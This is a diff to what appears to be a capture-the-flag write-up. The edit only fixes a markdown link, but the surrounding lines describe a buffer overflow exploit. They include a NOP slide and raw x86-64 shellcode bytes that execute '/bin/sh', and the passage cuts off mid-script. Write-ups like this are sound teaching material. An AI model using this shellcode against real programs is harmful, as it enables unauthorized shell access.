@@ -125,7 +125,7 @@ syscall
 nop
 nop
 ````
-The nops are there to aline the address. Then we place the string `/bin/sh` immediately after the shell code so rdi will point to this string. Now the syscall will execute a shell and we pwned the binary. I used (this)[https://defuse.ca/online-x86-assembler.htm#disassembly] online assembler to get the bytes for the shellcode. In our script the second overflow look like this:
+The nops are there to aline the address. Then we place the string `/bin/sh` immediately after the shell code so rdi will point to this string. Now the syscall will execute a shell and we pwned the binary. I used [this](https://defuse.ca/online-x86-assembler.htm#disassembly) online assembler to get the bytes for the shellcode. In our script the second overflow look like this:
 ````
 nop_slide = b"\x90"*10
 shell_code = b"\x48\xC7\xC2\x00\x00\x00\x00\x48\x8D\x3D\x12\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\x90\x90"
